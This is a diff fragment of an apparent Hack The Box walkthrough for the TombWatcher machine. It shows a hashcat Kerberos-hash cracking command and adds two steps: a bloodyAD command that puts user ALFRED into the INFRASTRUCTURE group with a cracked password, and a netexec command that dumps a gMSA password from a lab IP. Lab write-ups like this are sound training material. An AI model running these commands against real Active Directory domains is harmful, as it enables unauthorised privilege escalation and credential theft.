@@ -40,7 +40,14 @@
 `hashcat -m 13100 hash.txt /usr/share/wordlist/rockyou.txt`
 ![image](https://github.com/user-attachments/assets/60b15e59-d3fe-4e3a-b44e-e668b79b5e84)
 
-5. 
+5. Add Alfred to Infrastructure group using BloodyAD
+`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.47.3 -d TOMBWATCHER.HTB -u ALFRED -p basketball add groupMember INFRASTRUCTURE ALFRED`
+
+6. Get GMSA password using netexec
+`nxc ldap 10.129.47.3 -u alfred -p basketball --gmsa`
+
+
+7. 
 
 
 
